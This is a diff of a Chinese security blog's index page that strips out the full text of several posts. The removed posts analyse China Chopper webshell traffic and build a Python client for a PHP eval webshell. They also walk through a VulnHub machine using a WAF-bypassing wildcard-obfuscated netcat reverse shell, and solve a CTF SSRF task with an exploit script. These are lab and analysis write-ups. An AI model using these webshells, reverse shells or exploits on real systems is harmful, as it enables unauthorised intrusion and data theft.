@@ -380,56 +380,8 @@ bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  s
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="类似前言一样的废话"><a href="#类似前言一样的废话" class="headerlink" title="类似前言一样的废话"></a>类似前言一样的废话</h1><p>上一次的文章中是分析了<code>Windows</code>系统上<code>中国菜刀</code>的工作原理，于是突发奇想，便想着用Python3也写一个和菜刀功能一样的程序出来，其实可变的地方还是挺少的，考虑的点只有4个而已，内容中，尤其是正则匹配部分尤其辣眼睛，所以有意见可以提出来，然后我忽略掉就好了</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>为了方便测试，所以我是在本地的虚拟机搭建一个<code>apache+php</code>的环境然后在其根目录下放置一个<code>php一句话木马</code></p>
-<p><img src="https://Ernket.github.io/post-images/1570670163747.png" alt=""></p>
-<h1 id="开始乱写"><a href="#开始乱写" class="headerlink" title="开始乱写"></a>开始乱写</h1><p>首先我们要确定我们连接上木马文件，所需要什么东西</p>
-<ul>
-<li>文件url</li>
-<li>木马参数</li>
-</ul>
-<p>没有这两个就无法建立连接，所以开头的时候先把他安排上</p>
-<pre><code>url=str(input(&quot;木马url: &quot;))
-parameter=str(input(&quot;木马参数: &quot;))
-</code></pre><p>接着，开始写执行命令，和之前菜刀的原理一致，通过base64解码传入php语句，然后在其中传入执行语句</p>
-<p>为了模拟终端的样子，所以先把获取路径的功能给写了</p>
-<p>在php中，<code>dirname()</code>可以用来获取该文件的目录</p>
-<p>举个例子，如果文件路径为<code>/var/www/html/elapse.php</code>那么，<code>dirname()</code>后得到的路径就是<code>/var/www/html/</code>，是该文件的当前目录</p>
-<p>而<code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code>全局预定义变量可以用来获取当前执行的php的完整路径，于是<code>dirname()</code>配合<code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code>就可以得到当前文件所在的目录，一开始连接时就cd过去</p>
-<p>具体代码如下，因为这里用的也是base64解码的关系，所以会在代码中注释部分base64内容</p>
-<p><img src="https://Ernket.github.io/post-images/1570670187136.png" alt=""></p>
-<p>在上面的代码中，我只需要给它<code>url</code>（木马的url地址）parameter（木马参数）和无关紧要的header（http头部）</p>
-<p><img src="https://Ernket.github.io/post-images/1570670194004.png" alt=""></p>
-<p>运行一下，成功得到路径，接下来开始写正文部分</p>
-<p>根据菜刀中的</p>
-<pre><code>php-&gt;z0-&gt;z1 #z0为执行代码部分 z1为shell，也就是/bin/sh
-       -&gt;z2 #z2的内容为执行所需要的命令
-</code></pre><p>首先先先构造一个新的php一句话木马</p>
-<p><img src="https://Ernket.github.io/post-images/1570670209525.png" alt=""></p>
-<p>接着传入本体代码以及shell和执行所需的命令 (因太长，不贴出来，可移步<a href="&quot;http://blog.ernket.top/post/zhong-guo-cai-dao-fen-xi/&quot;">上一篇</a>)</p>
-<p><img src="https://Ernket.github.io/post-images/1570670222183.png" alt=""></p>
-<p>但是这里要注意的一点是，command这个命令在传过去的时候，那边需要经过base64解码后才会生效，所以这里我们得将语句拼接完后，将他base64编码</p>
-<p><img src="https://Ernket.github.io/post-images/1570670228494.png" alt=""></p>
-<p>我们拿浏览器测试一下这样是否会生效</p>
-<p><img src="https://Ernket.github.io/post-images/1570670234013.png" alt=""></p>
-<p>为了方便测试，我这里执行的命令只有<code>id</code>而已</p>
-<p>那么，执行成功后，结果有了，需要对数据内容进行筛选，因为为了做到目录切换，命令执行后的数据还包含了当前路径</p>
-<p>我这里是写了一个正则，将内容都区分开来</p>
-<p><img src="https://Ernket.github.io/post-images/1570670309606.png" alt=""></p>
-<p>因为最后三个是路径还有两个为空的值，所以最后三个不作为结果输出出来</p>
-<pre><code>...
-    for i in range(len(result)-3):
-        print (result[i]+&quot; &quot;,end=&quot;&quot;)
-</code></pre><p>命令执行的部分就到这里了，那么现在解决目录切换的问题</p>
-<p>在上面的执行结果中，包含了我这条命令执行后所在的位置</p>
-<p>所以我将结果return出来，调换掉前面的<code>file_path</code>作为我开始时cd进去的路径就好了</p>
-<p>同时，因为一开始是在该文件的当前目录下，所以一开始的路径不能变，而且用户如果敲回车的话，也会将命令发送过去执行，在那边会报错，所以做一个判断</p>
-<p><img src="https://Ernket.github.io/post-images/1570670321392.png" alt=""></p>
-<p>如果是回车的话，就直接把当前路径返回回去，不放到那边执行了</p>
-<p>这个是测试结果</p>
-<p><img src="https://Ernket.github.io/post-images/1570670327637.png" alt=""></p>
-<p><a href="&quot;https://github.com/Ernket/PythonCaidao&quot;">源码链接</a></p>
-
+              <!--more-->
+          
       
     </div>
     
@@ -438,6 +390,10 @@ parameter=str(input(&quot;木马参数: &quot;))
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2019/10/10/ji-yu-python3-de-mu-ma-lian-jie-gong-ju-bian-xie/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -486,109 +442,8 @@ parameter=str(input(&quot;木马参数: &quot;))
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="类似前言一样得废话"><a href="#类似前言一样得废话" class="headerlink" title="类似前言一样得废话"></a>类似前言一样得废话</h1><p>昨天偶然看到了中国菜刀这个词，突然发现这类软件的工作原理倒是没有好好看过，只看过<code>pwntools</code>的，所以难得有时间，便开着wireshark搞一手，看看发了什么玩意</p>
-<p>首先大体分为两种，一种是读取文件的shell，一种是执行命令的shell</p>
-<h1 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h1><p>菜刀用的方式是这样的</p>
-<pre><code>第一个php马-&gt;z1[post]-&gt;r=z1+z2（拼接语句）
-          -&gt;z2[post]
-          #z1为/bin/sh
-          #z2为执行所需的命令
-</code></pre><p>在第一个php马中，执行php语句，该Php语句因为过狗的关系，其中所需的值是需要通过二次post来传入的</p>
-<p>首先在菜刀中，右键选择虚拟终端<br><img src="https://Ernket.github.io/post-images/1570025438345.png" alt=""><br><img src="https://Ernket.github.io/post-images/1570025451253.png" alt=""></p>
-<p>先试着运行一个命令<code>id</code>，然后抓包分析一下</p>
-<p>这里为了方便解释，所以贴一下一句话木马，我的参数是-7</p>
-<pre><code>&lt;?php eval($_POST[-7]);?&gt;
-</code></pre><p>在第一个包中，找到菜刀发送到服务端的包</p>
-<p><img src="https://Ernket.github.io/post-images/1570025542801.png" alt=""></p>
-<p>首先它传入了第一个参数是<code>-7</code>，内容是base64，解码后可得</p>
-<pre><code>@eval (base64_decode($_POST[z0]));
-</code></pre><p>众所周知，在php中，eval函数，会将括号内的字符串，当作php语句来执行，而菜刀的做法是，在其中又套了一个一句话木马，参数为<code>z0</code></p>
-<p>然后它传入了第二个参数，参数为<code>z0</code>，内容为</p>
-<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$p=base64_decode($_POST[&quot;z1&quot;]);$s=base64_decode($_POST[&quot;z2&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;$r=&quot;{$p} {$c}&quot;;@system($r.&quot; 2&gt;&amp;1&quot;,$ret);print ($ret!=0)?&quot;
-ret={$ret}
-&quot;:&quot;&quot;;;echo(&quot;|&lt;-&quot;);die();
-</code></pre><p>内容有点鬼畜，我们挨个分析，首先是开头的三个函数</p>
-<p>@ini_set(“display_errors”,”0”); 这个是临时关闭PHP的错误显示</p>
-<p>@set_time_limit(0); 防止执行命令的时候超时</p>
-<p>@set_magic_quotes_runtime(0); 关闭魔术引号</p>
-<p>然后就是代码部分</p>
-<pre><code>$p=base64_decode($_POST[&quot;z1&quot;]);$s=base64_decode($_POST[&quot;z2&quot;]);
-</code></pre><p>它又套了两个参数z1和z2，需要再次post传输进去</p>
-<pre><code>$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);
-</code></pre><p>$d通过<code>dirname</code>来获取父目录</p>
-<p>首先解释一下<code>$_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>，这个函数的是用来读取该文件所在的位置，在这个环境中是<code>/var/www/html/elapse/file.php</code></p>
-<p>而<code>dirname</code>，则可以用来读取父目录</p>
-<p>我在上面通过<code>$_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>获取到了文件路径为<code>/var/www/html/elapse/file.php</code></p>
-<p>那么dirname在读取的时候，得到的结果是<code>/var/www/html/elapse/</code></p>
-<p>然后将这个结果赋值给$d，至于这个\$d有什么用，是后话了</p>
-<p>解析来就是有意思的部分了</p>
-<pre><code>$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;$r=&quot;{$p} {$c}&quot;;
-</code></pre><p>这里要解释一下在php中?:是什么意思</p>
-<p>这个是<code>三目运算符</code>，看着很高级，其实就是条件运算符，但是为了快捷简单，于是便用这种方法来取代<code>if else</code></p>
-<p>用法如下</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$b</span> <span class="token operator">?</span> <span class="token keyword">print</span> <span class="token string">"a>b"</span> <span class="token punctuation">:</span> <span class="token string">"a&lt;b"</span><span class="token punctuation">;</span>
-
-<span class="token shell-comment comment">#等价于</span>
-<span class="token variable">$if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-<span class="token keyword">print</span><span class="token string">"a>b"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">else</span><span class="token punctuation">{</span>
-    <span class="token keyword">print</span><span class="token string">"a&lt;b"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p>回到代码上</p>
-<pre><code>$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;$
-</code></pre><p>这里的</p>
-<pre><code>substr($d,0,1)==&quot;/&quot;
-</code></pre><p>为条件，如果这个路径的第一位为/，那么这个条件就是true，为真，然后他就会执行<code>?</code>后面的东西，然后将执行的语句拼合起来</p>
-<p>执行的语句我们看回z2</p>
-<pre><code>cd &quot;/var/www/html/elapse/&quot;;id;echo [S];pwd;echo [E]
-</code></pre><p>在数据包中，我们还发现了一个z2参数，这个参数是接下来要在对方机器所需要执行的命令，内容如下</p>
-<pre><code>cd &quot;/var/www/html/elapse/&quot;;id;echo [S];pwd;echo [E]
-</code></pre><p>$d的内容拼接到了cd 后面，然后执行你在虚拟终端中给的命令，接着输出一个<code>[S]</code>来区分命令，最后，执行pwd，查看当前路径，然后保存下来，供下一条命令cd用，这样就能做到实时切换目录了，不会因为这次操作了，下一次路径又回到之前的</p>
-<pre><code>$r=&quot;{$p} {$c}&quot;;@system($r.&quot; 2&gt;&amp;1&quot;,$ret);print ($ret!=0)?&quot;
-ret={$ret}
-</code></pre><p>接着就到了执行语句的部分,$r的内容为是拼接的，\$c为执行语句，而\$p则是参数z1传入的，内容为<code>/bin/sh</code>，拼在一起就是</p>
-<pre><code>/bin/sh -c cd &quot;/var/www/html/elapse/&quot;;id;echo [S];pwd;echo [E]
-</code></pre><p>然后<code>2&gt;&amp;1</code>将无用的信息丢到垃圾桶里去,接着放到判断里，如果不是空的，那么就赋值过去，如果是空的，那就啥都不输出</p>
-<p>总结一下，就是</p>
-<pre><code>1.通过一句话木马传入新得php语句
-2.通过该php语句传入真正的执行命令的语句
-3.传入上一条2的php语句中所需要的参数使其能正常工作，有/bin/sh和cd /var/www/;等命令
-4.将执行结果返还给你
-</code></pre><h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p>查看文件的Shell则比执行命令来的简单一些</p>
-<p><img src="https://Ernket.github.io/post-images/1570025591589.png" alt=""></p>
-<p>这里分两个，一个是读取文件夹内容的，一个是读取文件内容的，先说文件夹的</p>
-<p><img src="https://Ernket.github.io/post-images/1570025599946.png" alt=""></p>
-<p>以下为解码的主要内容</p>
-<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL){echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;
-&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(&quot;|&lt;-&quot;);die();
-</code></pre><p>首先还是老套路通过<code>$D=base64_decode($_POST[&quot;z1&quot;]);</code>来传入一个路径，该路径为你在菜刀中双击选择的路径（或者为默认的文件所在路径）</p>
-<p>获取到了之后，通过<code>$F=@opendir($D);</code>来获取文件夹下的文件名，如果路径不存在，那么</p>
-<pre><code>if($F==NULL){echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);}
-</code></pre><p>发送报错，提示路径不存在</p>
-<p>否则的话就</p>
-<pre><code>$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;
-&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};
-</code></pre><p>通过while循环读取内容，路径怎么来的呢，<code>$P=$D.&quot;/&quot;.$N;</code>拼合来的</p>
-<p>后面就很人性化的写出了文件创建、修改的时间</p>
-<p><img src="https://Ernket.github.io/post-images/1570025611149.png" alt=""></p>
-<pre><code>$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));
-</code></pre><p>然后通过函数<code>fileperms</code>返回文件权限</p>
-<pre><code>@$E=substr(base_convert(@fileperms($P),10,8),-4);
-</code></pre><p>这里的<code>substr(x,10,8),-4)</code>的意思是，只显示x内容的前10位，然后只显示8个字符，最后从后往前数4位，最后得到了对应的权限</p>
-<p><code>0644</code></p>
-<p>以及</p>
-<pre><code>if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;}
-</code></pre><p>对该文件是文件还是文件夹做的判断</p>
-<p>最后全部echo出来</p>
-<p>菜刀，很细节，好吧</p>
-<p>文件读取呢，比较弱智，代码是这样的</p>
-<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F=base64_decode($_POST[&quot;z1&quot;]);$P=@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)));@fclose($P);;echo(&quot;|&lt;-&quot;);die();
-</code></pre><p>就是fopen打开来读取然后关闭，没了</p>
-
+              <!--more-->
+          
       
     </div>
     
@@ -601,6 +456,10 @@ ret={$ret}
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a   href="/2019/10/02/zhong-guo-cai-dao-fen-xi/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -726,51 +585,8 @@ ret={$ret}
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="靶机下载地址："><a href="#靶机下载地址：" class="headerlink" title="靶机下载地址："></a>靶机下载地址：</h3><ul>
-<li><a href="https://www.vulnhub.com/entry/minu-1,235/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/minu-1,235/</a></li>
-</ul>
-<h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><ul>
-<li><p><code>192.168.1.159</code>-Kali Linux</p>
-</li>
-<li><p><code>192.168.1.161</code>-靶机</p>
-</li>
-</ul>
-<p>先用<code>nmap</code>查看靶机开启什么服务</p>
-<p><img src="https://Ernket.github.io/post-images/1565427948353.png" alt=""></p>
-<p>只有一个http服务，丢到爆破工具中扫描后台，得到<code>test.php</code></p>
-<p><img src="https://Ernket.github.io/post-images/1565427960912.png" alt=""></p>
-<p>看链接以为是文件包含，试验了一下，都是403，估摸着是有waf拦截了，最后尝试了一下命令注入，发现可行</p>
-<p><img src="https://Ernket.github.io/post-images/1565427970589.png" alt=""></p>
-<p>手工试了一些后，发现ls、cat这些命令无法正常执行，所以只能换个方法，在尝试的时候发现用通配符问号来代替的话，不会被waf拦截</p>
-<pre><code>http://192.168.1.161/test.php?file=|/b?n/c?t%20/e?c/?a??wd
-</code></pre><p><img src="https://Ernket.github.io/post-images/1565427975823.png" alt=""><br><img src="https://Ernket.github.io/post-images/1565427979994.png" alt=""></p>
-<p>从上面这一步可以知道这个waf的工作原理，所以我们只需要将敏感词部分用问号代替就可以绕过waf了</p>
-<p>那么现在的问题是，如何通过这个命令注入让靶机执行反弹shell的命令</p>
-<p>如果是直接<code>nc -e /bin/sh ip port</code>这种方式的话会被waf拦截，所以得想另外一种可执行命令的方法</p>
-<p>后来就想到Linux管道符的特性</p>
-<blockquote>
-<p> 在Linux中，管道符左边的命令输出会作为管道符右边的命令的输入然后去执行，若存在多个则以此类推</p>
-</blockquote>
-<p>举个例子<br><img src="https://Ernket.github.io/post-images/1565428004403.png" alt=""></p>
-<p>所以这里用base64的方式来传入执行的命令，然后在解码执行</p>
-<p>明文:</p>
-<pre><code>/bin/echo &quot;nc -e /bin/sh 192.168.1.159 4444&quot; | /usr/bin/base64 | /bin/sh
-</code></pre><p>base64编码后及过waf操作后:</p>
-<pre><code>/b?n/e??o bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTU5IDQ0NDQg|/?s?/b??/b??e64 -d|/b?n/sh
-</code></pre><p><img src="https://Ernket.github.io/post-images/1565428012214.png" alt=""></p>
-<p>其中<code>bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTU5IDQ0NDQg</code>的意思就是<code>nc -e /bin/sh 192.168.1.159 4444</code></p>
-<p>随后我们得到了shell，转成tty先<br><img src="https://Ernket.github.io/post-images/1565428027040.png" alt=""></p>
-<pre><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre><p>(注意是python3，不能直接python，神坑，这里是大佬<code>RJ45</code>指点了一番)</p>
-<p>我们在<code>/home/bob/</code>目录下发现了一个隐藏文件<code>._pw_</code><br><img src="https://Ernket.github.io/post-images/1565428035856.png" alt=""></p>
-<p>cat查看发现是一大串字符串<br><img src="https://Ernket.github.io/post-images/1565428050124.png" alt=""></p>
-<p>丢到百度上，匹配到了一个名为<code>JWT</code>的令牌</p>
-<p>上官网(jwt.io)看介绍，发现这玩意是私钥加密来的</p>
-<p><img src="https://Ernket.github.io/post-images/1565428052870.png" alt=""></p>
-<p>于是乎，在github上面搜<code>jwt crack</code><br><img src="https://Ernket.github.io/post-images/1565428067397.png" alt=""><br>我这里就用了第一个(<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a>)</p>
-<p>按照说明配置好后，直接把api丢过去破解，一段时间后就出来了<br><img src="https://Ernket.github.io/post-images/1565428075951.png" alt=""></p>
-<p>得到密码为<code>mlnV1</code>，然后就可以直接切换到root用户了<br><img src="https://Ernket.github.io/post-images/1565428082713.png" alt=""></p>
-
+              <!--more-->
+          
       
     </div>
     
@@ -783,6 +599,10 @@ ret={$ret}
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a   href="/2019/08/10/minuv1-ba-ji-shen-tou/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -831,180 +651,8 @@ ret={$ret}
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>题目链接：<a href="http://139.180.128.86" target="_blank" rel="noopener">http://139.180.128.86</a></p>
-<p>访问网页<br><img src="https://Ernket.github.io/post-images/1565164528213.png" alt=""><br>得到一大串这种东西，稍微看了一下是python写的，于是放到编辑器里稍微还原一下<br><img src="https://Ernket.github.io/post-images/1565164534586.png" alt=""><br>这里先把源码贴出来</p>
-<pre class=" language-Python"><code class="language-Python">#! /usr/bin/env python 
-#encoding=utf-8 
-from flask import Flask 
-from flask import request 
-import socket 
-import hashlib 
-import urllib 
-import sys 
-import os
-import io
-import json 
-sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='latin1')
-app = Flask(__name__)
-secert_key = os.urandom(16)
-print(secert_key)
-class Task: 
-    def __init__(self, action, param, sign, ip):
-        self.action = action
-        self.param = param
-        self.sign = sign
-        self.sandbox = md5(ip)
-        if(not os.path.exists(self.sandbox)):
-            #SandBox For Remote_Addr
-            os.mkdir(self.sandbox)
-            def Exec(self):
-                result = {}
-                result['code'] = 500
-                if (self.checkSign()):
-                    if "scan" in self.action: 
-                        tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
-                        resp = scan(self.param)
-                        if (resp == "Connection Timeout"):
-                            result['data'] = resp
-                        else:
-                            print (resp)
-                            tmpfile.write(resp)
-                            tmpfile.close()
-                            result['code'] = 200
-                    if "read" in self.action:
-                        f = open("./%s/result.txt" % self.sandbox, 'r')
-                        result['code'] = 200
-                        result['data'] = f.read()
-                        if result['code'] == 500:
-                            result['data'] = "Action Error"
-                        else:
-                            result['code'] = 500
-                            result['msg'] = "Sign Error"
-                            return result
-    def checkSign(self):
-        if (getSign(self.action, self.param) == self.sign):
-            return True
-        else: 
-            return False 
-            #generate Sign For Action Scan. 
-@app.route("/geneSign", methods=['GET', 'POST'])
-def geneSign():
-    print("1")
-    param = urllib.unquote(request.args.get("param", ""))
-    action = "scan"
-    return getSign(action, param)
-@app.route('/De1ta',methods=['GET','POST'])
-def challenge():
-    action = urllib.unquote(request.cookies.get("action"))
-    param = urllib.unquote(request.args.get("param", ""))
-    sign = urllib.unquote(request.cookies.get("sign"))
-    ip = request.remote_addr
-    if(waf(param)): #不能让他执行，waf(param)必须等于false
-        return "No Hacker!!!!"
-    task = Task(action, param, sign, ip)
-    return json.dumps(task.Exec())
-
-@app.route('/')
-def index():
-    return open("code.txt","r").read()
-
-def scan(param):
-    socket.setdefaulttimeout(1)
-    try:
-        return urllib.urlopen(param).read()[:50]
-    except:
-        return "Connection Timeout"
-def getSign(action, param):
-    return hashlib.md5(secert_key + param + action).hexdigest()
-def md5(content):
-    return hashlib.md5(content).hexdigest()
-def waf(param):
-    check=param.strip().lower()
-    if check.startswith("gopher") or check.startswith("file"):
-        return True
-    else:
-        return False
-if __name__ == '__main__':
-    app.debug = False
-    app.run(host='0.0.0.0',port=80)
-</code></pre>
-<p>审计一番，首先可以确认的是</p>
-<blockquote>
-<p>1.getSign()是md5加密的，方式为一个随机的key+param+action</p>
-<p>2.利用点在scan()，这里通过urlopen来打开文件，所以可以利用来打开flag.txt</p>
-<p>3.前后有md5校验，所以得保证md5校验没问题</p>
-</blockquote>
-<p>首先看这个<br><img src="https://Ernket.github.io/post-images/1565164540092.png" alt=""><br>我们确认了利用点在<code>scan()</code>，而scan是在<code>class Task</code>中的<br><img src="https://Ernket.github.io/post-images/1565164550427.png" alt=""><br>只有上图这部分调用了，所以可以判断到，通过get方式传入文件名就可以得到该内容了</p>
-<pre class=" language-python"><code class="language-python">resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#scan()</span>
-<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>
-    <span class="token keyword">except</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span>
-</code></pre>
-<p>在31行中，就会调用scan()，然后利用Urlopen()打开文件，最后通过json的方式传回给我们</p>
-<p>但是在此之前，前面有一个校验的函数存在<br><img src="https://Ernket.github.io/post-images/1565164564151.png" alt=""><br>首先先绕过这里的校验<br><img src="https://Ernket.github.io/post-images/1565164569650.png" alt=""><br>这里是md5校验的部分，而加密的MD5可以通过<code>geneSign()</code>来得到</p>
-<pre><code>import requests
-url=&quot;http://139.180.128.86&quot;
-file=&quot;flag.txt&quot;
-r = requests.get(url+&#39;/geneSign?param=%sread&#39; %file)
-print(r.text)
-</code></pre><p>解释一下为什么flag.txt后面得接一个read</p>
-<p>因为在<code>geneSign()</code>中，不单有一个param，还有一个<code>action</code>,而action的值为<code>scan</code>，到下面加密的代码里</p>
-<pre><code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def geneSign():
-    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-    action = &quot;scan&quot;
-    return getSign(action, param)
-</code></pre><pre><code>def getSign(action, param):
-    return hashlib.md5(secert_key + param + action).hexdigest()
-</code></pre><p>是一个随机的<code>key+param+action</code></p>
-<p>也就是</p>
-<p>key+param+’scan’</p>
-<p>key+flag.txtread+scan 这样去加密的</p>
-<p>回过头来看一下校验是怎么校验的</p>
-<p>他拿action和param这两个值去加密，然后去校验我们的加密结果，所以我们得让这里的加密也是<code>key+flag.txtread+scan</code> 这样去加密的</p>
-<p>解决了md5的问题后，得找一些这些值怎么传过去<br><img src="https://Ernket.github.io/post-images/1565164580287.png" alt=""><br>在62行中，发现一个<code>challenge()</code>得函数，action这些是通过cookie来获取到得，而param是通过get的方式传入的</p>
-<p>整理一下信息，就是访问的时候得这样</p>
-<blockquote>
-<p>#cookie内容</p>
-<p>actoin=readscan  得这样配合加密，绕过验证</p>
-<p>sign=xxx 这里的值为前面md5加密的内容</p>
-<h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><p>param的内容直接get传入就好了</p>
-<p>?param=flag.txt  这样</p>
-</blockquote>
-<p>可能到了这一步，会质疑为什么一定得存在<code>read</code>，如果没有read的话md5校验不是也能过吗</p>
-<p>在39行中，有一个if是检测read是否在里面的，如果没有，那么我们即使获取到了文件内容，也输出不出来<br><img src="https://Ernket.github.io/post-images/1565164588959.png" alt=""><br>下面是python代码</p>
-<pre><code># coding:utf-8
-import requests
-
-
-url=&quot;http://139.180.128.86&quot;
-
-
-def getSign(param):
-    r = requests.get(&#39;%s/geneSign?param=%s&#39; % (url, param)) #http://139.180.128.86/geneSign?param/flag.txtread
-    if r.status_code == 200:
-        return r.text
-    return &quot;&quot;
-
-
-def Result(sign, param):
-    header = {
-        &#39;Cookie&#39;: &#39;action=readscan; sign=%s;&#39; % sign, #readscan过校验
-    }
-    r = requests.get(&#39;%s/De1ta?param=%s&#39; % (url, param), headers=header)
-    if r.status_code == 200:
-        print(r.text)
-
-
-file=&quot;flag.txt&quot;
-sign = getSign(&#39;%sread&#39; % file) #flag.txtread 
-Result(sign, file)
-</code></pre><p><img src="https://Ernket.github.io/post-images/1565164597158.png" alt=""></p>
-
+              <!--more-->
+          
       
     </div>
     
@@ -1017,6 +665,10 @@ Result(sign, file)
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a   href="/2019/08/07/de1ctf-ssrf-me_writeup/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1065,106 +717,8 @@ Result(sign, file)
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="类似前言一样的废话"><a href="#类似前言一样的废话" class="headerlink" title="类似前言一样的废话"></a>类似前言一样的废话</h1><p>强网杯过去有一段时间了，开始时因为在外地，没什么时间，下飞机的时候刚好比赛结束，所以题目基本没碰，难得暑假有时间了，把以前在PHP反序列化上的不足弥补了一下，打算照着其他老师傅的writeup把题目做一遍，文内如有雷同，那肯定是我抄的</p>
-<p>Docker环境链接:<a href="https://github.com/glzjin/qwb_2019_upload" target="_blank" rel="noopener">https://github.com/glzjin/qwb_2019_upload</a></p>
